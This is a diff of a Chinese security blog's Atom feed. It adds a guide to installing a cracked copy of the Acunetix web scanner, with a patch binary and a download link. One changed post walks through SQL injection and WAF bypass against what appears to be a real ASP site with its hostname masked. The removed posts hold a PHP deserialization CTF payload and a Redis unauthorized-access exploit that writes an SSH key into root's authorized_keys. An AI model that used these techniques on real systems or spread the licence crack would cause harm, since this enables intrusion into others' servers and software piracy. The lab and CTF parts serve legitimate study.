@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.wafer.org.cn/"/>
-  <updated>2020-06-15T15:41:01.991Z</updated>
+  <updated>2020-06-16T05:17:50.685Z</updated>
   <id>https://www.wafer.org.cn/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Untitled</title>
+    <link href="https://www.wafer.org.cn/2020/06/16/Untitled/"/>
+    <id>https://www.wafer.org.cn/2020/06/16/Untitled/</id>
+    <published>2020-06-16T05:17:50.685Z</published>
+    <updated>2020-06-16T05:17:50.685Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux版本AWVS破解版</title>
+    <link href="https://www.wafer.org.cn/2020/06/16/Linux%20%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%A0%B4%E8%A7%A3%E7%89%88awvs%E6%95%99%E7%A8%8B/"/>
+    <id>https://www.wafer.org.cn/2020/06/16/Linux%20%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%A0%B4%E8%A7%A3%E7%89%88awvs%E6%95%99%E7%A8%8B/</id>
+    <published>2020-06-16T04:20:44.244Z</published>
+    <updated>2020-06-16T05:17:48.368Z</updated>
+    
+    <content type="html"><![CDATA[<p>AWVS简介：</p><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞，如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他Web应用程序。75% 的互联网攻击目标是基于Web的应用程序。因为他们时常接触机密数据并且被放置在防火墙之前。</p><p>安装第一步：</p><p>安装环境所需要的依赖 sudo apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 -y</p><p>安装第二步：</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-3b537a22e344d944.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>运行./acunetix_trial.sh</p><p>安装第三步:</p><p>这一步需要就行四样确认</p><p>*<em>是否同意协议:yes<br>*</em></p><hr><p><strong>输入主机名: xxx</strong></p><hr><p><strong>输入管理员邮箱:<a href="mailto:xxx@xxx.com">xxx@xxx.com</a> 就是用户名</strong></p><hr><p><strong>输入密码:要存在字母，数字，符号3种组合</strong></p><p>安装结束后访问:</p><p><a href="https://ip:13443/" target="_blank" rel="noopener">https://ip:13443/</a> ip地址就是本机ip</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-991bb74e26c2c5b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>现在进行破解</p><p>将文件中的 patch_awvs拷贝到安装目录下：</p><p>cp patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/</p><p>然后进入到所安装目录下</p><p>cd patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/ </p><p>然后在运行</p><p>./patch_awvs</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-0147d1d7f6896709.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>如果出现以下界面就代表破解成功。</p><p>然后去登录awvs在右上角的”Administrator-&gt;Profile-&gt;License”,如果看到99999就说明成功激活</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-e9a2ae057b1b4b1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p><strong>下载资源</strong></p><p>百度网盘：<a href="https://pan.baidu.com/s/1hUFISunnBcnL0nV33cib9g" target="_blank" rel="noopener">https://pan.baidu.com/s/1hUFISunnBcnL0nV33cib9g</a></p><p>提取码：192u</p><p>由于这些都是我从我自己的简书搬过来的文章所以时间有点晚.</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;AWVS简介：&lt;/p&gt;
+&lt;p&gt;Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞，如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他W
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://www.wafer.org.cn/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="工具" scheme="https://www.wafer.org.cn/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
   
   <entry>
     <title>正义制裁-看直播被勒索</title>
@@ -316,9 +358,9 @@
     <link href="https://www.wafer.org.cn/2020/03/20/asp%E6%B3%A8%E5%85%A5/"/>
     <id>https://www.wafer.org.cn/2020/03/20/asp%E6%B3%A8%E5%85%A5/</id>
     <published>2020-03-20T09:53:28.696Z</published>
-    <updated>2020-06-16T04:18:13.052Z</updated>
+    <updated>2020-06-16T04:19:21.287Z</updated>
     
-    <content type="html"><![CDATA[<p><strong>基本信息:</strong></p><p>1.存在WTS  WAF</p><p>2.asp+access数据库</p><p>3.注入点id</p><a id="more"></a><p><strong>1.找注入点</strong></p><p>先加个.0这里就是为了绕过waf不要直接上来就是and 1=1…..</p><p><a href="http://xxxxxx/about_list.asp?id=143.0" target="_blank" rel="noopener">http://xxxxxx/about_list.asp?id=143.0</a></p><p>页面正常</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-da499ae87a0a3d7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>测试 .1 </p><p><a href="http://xxxxxx/about_list.asp?id=143.1" target="_blank" rel="noopener">http://xxxxxx/about_list.asp?id=143.1</a></p><p>页面报错,内容看到800a0bcd就舒服了.正常的话 asp站基本上是access,Sqlserver这两种数据库</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-0404db41980e15c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>2.绕过WTS—WAF</p><p>我们测试order by 5或100的时候都出现缺少分号,这里卡了半天(就是太垃圾了),然后在一位师傅指点了下,我们来理解下.</p><p>他后端把参数带进去是直接拼接对吧,正常来说他后端执行的句子是这样</p><p>select columns from tables where id = ? ;</p><p>但有可能问号后还有句子,正常来说先判断布尔值对吧</p><p>比如刚开始你payload是and 1 like 1这样拼接进去只是给where加了一个条件,问号后有没有执行其他句子都无所谓对吧,但是如果问号后还有句子要执行,你payload又提前order by可能就导致句子没闭合了,所以这里order by 失效 我们只能猜表.</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-e25688dda06e8a74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>然后就开始猜表,然后WTS-WAF出现,出现不要惊慌,吃个橘子,一顿毛操作 一个”%”绕过,因为这种waf(几年前的waf)很好绕过在加上asp的特性%完全能过绕过WTS.还有多种绕过WTS方法以及后续文章绕过安全狗和云锁方法都会提到</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-99787aa180742308.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-1184e835e49f3144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>发现admin表不在,直接burp一开字典一扔manager表出来了</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-aa6b710d08de71a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>接下来就是跑字段,一样重复操作就不再放出来了…</p><p>睡觉了<a href="https://www.jianshu.com/p/b2da19279f1f" target="_blank" rel="noopener">https://www.jianshu.com/p/b2da19279f1f</a>)</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>基本信息:</strong></p><p>1.存在WTS  WAF</p><p>2.asp+access数据库</p><p>3.注入点id</p><a id="more"></a><p><strong>1.找注入点</strong></p><p>先加个.0这里就是为了绕过waf不要直接上来就是and 1=1…..</p><p><a href="http://xxxxxx/about_list.asp?id=143.0" target="_blank" rel="noopener">http://xxxxxx/about_list.asp?id=143.0</a></p><p>页面正常</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-da499ae87a0a3d7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>测试 .1 </p><p><a href="http://xxxxxx/about_list.asp?id=143.1" target="_blank" rel="noopener">http://xxxxxx/about_list.asp?id=143.1</a></p><p>页面报错,内容看到800a0bcd就舒服了.正常的话 asp站基本上是access,Sqlserver这两种数据库</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-0404db41980e15c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>2.绕过WTS—WAF</p><p>我们测试order by 5或100的时候都出现缺少分号,这里卡了半天(就是太垃圾了),然后在一位师傅指点了下,我们来理解下.</p><p>他后端把参数带进去是直接拼接对吧,正常来说他后端执行的句子是这样</p><p>select columns from tables where id = ? ;</p><p>但有可能问号后还有句子,正常来说先判断布尔值对吧</p><p>比如刚开始你payload是and 1 like 1这样拼接进去只是给where加了一个条件,问号后有没有执行其他句子都无所谓对吧,但是如果问号后还有句子要执行,你payload又提前order by可能就导致句子没闭合了,所以这里order by 失效 我们只能猜表.</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-e25688dda06e8a74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>然后就开始猜表,然后WTS-WAF出现,出现不要惊慌,吃个橘子,一顿毛操作 一个”%”绕过,因为这种waf(几年前的waf)很好绕过在加上asp的特性%完全能过绕过WTS.还有多种绕过WTS方法以及后续文章绕过安全狗和云锁方法都会提到</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-99787aa180742308.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-1184e835e49f3144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>发现admin表不在,直接burp一开字典一扔manager表出来了</p><p><img data-src="https://upload-images.jianshu.io/upload_images/18085116-aa6b710d08de71a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p><p>接下来就是跑字段,一样重复操作就不再放出来了…</p><p>睡觉了</p>]]></content>
     
     <summary type="html">
     
@@ -426,52 +468,6 @@
     
     
       <category term="http走私" scheme="https://www.wafer.org.cn/tags/http%E8%B5%B0%E7%A7%81/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一道php反序列化的ctf题</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
-    <published>2019-11-06T07:42:38.171Z</published>
-    <updated>2019-10-11T14:47:03.832Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境：phpstduy index.php class.php f1a9.php</p><a id="more"></a><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>f1a9.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="comment">//flag_Xd&#123;hSh_ctf:e@syt0g3t&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这些文件放在phpstduy www目录下。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>我们打开网页显示我不是admin右键查看网站源码得到</p><p><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt="1.png"><br>大概意思就是传入3个变量，$user不能为null，并且通过file_get_contents()函数读取判断值是否为admin，并且包含一个class.php文件.<br>代码很明确就是我们要传一个值为admin的$user，<br>通过php伪协议: php://filter来读取class.php文件   php://input 是个可以访问请求的原始数据的只读流，这里用来输入admin值。</p><p>什么是php伪协议这里很好解释了<a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php</a>这里就不在讲述了。<br>就是可以通过php://filter读取任意文件为base64编码的内容</p><p>现在我们使用hackbar来执行我们代码，成功读取内容为base64编码class.php文件<br><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt="2.png"><br>进行解码得<br><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3.png"><br>这里值得关注就是_toString():<br>_toString() 是魔术方法的一种，具体用途是当一个对象被当作字符串对待的时候，会触发这个魔术方法.<br>现在我们想办法触发这个方法，但是这里没有其他代码，我就尝试用php://filter来读取index.php文件看有没有什么，惊奇发现出现一个反序列化函数unserialize() 现在我们通过来echo($pass)来触发_toString()<br><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" alt="4.png"><br>于是我们构造反序列化的参数：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Read"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">57</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=f1a9.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">user</span>=php://<span class="keyword">input</span>&amp;file=<span class="keyword">class</span>.php&amp;pass=O:<span class="number">4</span>:"Read":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">57</span>:"php://filter/read=convert.base64-encode/resource=f1a9.php";&#125;</span><br></pre></td></tr></table></figure><p>成功读取<br><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" alt="7.png"><br>base64解码的flag<br><img data-src="/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" alt="6.png"></p><p>这里附上php反序列化讲解连接<a href="https://blog.csdn.net/cliffordr/article/details/829751" target="_blank" rel="noopener">php反序列化</a></p><p>总体来说这题ctf还是比较简单，以后会一直出代码审计的题，欢迎大佬来斧正。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;环境：phpstduy index.php class.php f1a9.php&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="ctf" scheme="https://www.wafer.org.cn/categories/ctf/"/>
-    
-    
-      <category term="php代码审计" scheme="https://www.wafer.org.cn/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>redis未授权访问利用复现</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
-    <published>2019-11-06T07:42:38.171Z</published>
-    <updated>2019-10-11T07:41:37.974Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><a id="more"></a><h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><p>本文参考了<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener"> bmjoker</a><br>这里主要说一下这篇文章未提及到的坑。</p><p>靶机：Ubuntu</p><p>Ubuntu安装redis</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzf redis<span class="number">-3.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>修改配置文件，使可以远程访问：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>在bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server<br>make结束后，进入src目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br></pre></td></tr></table></figure><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/12.png" alt="12.png"><br>返回目录redis-3.2.0，将redis.conf拷贝到/etc/目录下：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/13.png" alt="13.png"></p><p>使用/etc/目录下的reids.conf文件中的配置启动redis服务：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/11.png" alt="11.png"></p><p>服务启动成功，漏洞环境搭建完成</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="利用”公私钥”认证获取root权限"><a href="#利用”公私钥”认证获取root权限" class="headerlink" title="利用”公私钥”认证获取root权限"></a>利用”公私钥”认证获取root权限</h3><p>先在本地生成一对ssh公钥和私钥，设置密码为空:<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/10.png" alt="10.png"><br>进入.ssh目录：cd /.ssh(这里有个坑如果不是root用户就用 cd ~/.ssh)，将生成的公钥保存到waf.txt:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; waf.txt</span><br></pre></td></tr></table></figure><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥waf.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat waf.txt | redis-cli -h <span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span> -x set s-<span class="type">key</span></span><br></pre></td></tr></table></figure><p>远程登录靶机的redis服务：redis-cli -h 172.22.151.147<br>并使用 CONFIG GET dir 命令得到redis备份的路径：<br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）:<br>设置上传公钥的备份文件名字为authorized_keys：<br>然后保存 退出</p><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png" alt="2.png"></p><p>这里还有个坑，config set dir /root/.ssh 找不到<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png" alt="4.png"><br>因为这里我是首次安装Ubuntu,没有用root用户登录ssh,现在用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png" alt="6.png"></p><p>现在用这个命令连接，成功免密登录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa <span class="symbol">root@</span><span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png" alt="1.png"></p><p>这篇文章到此结束，写的时候之艰难，第一次用hexo写文章。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
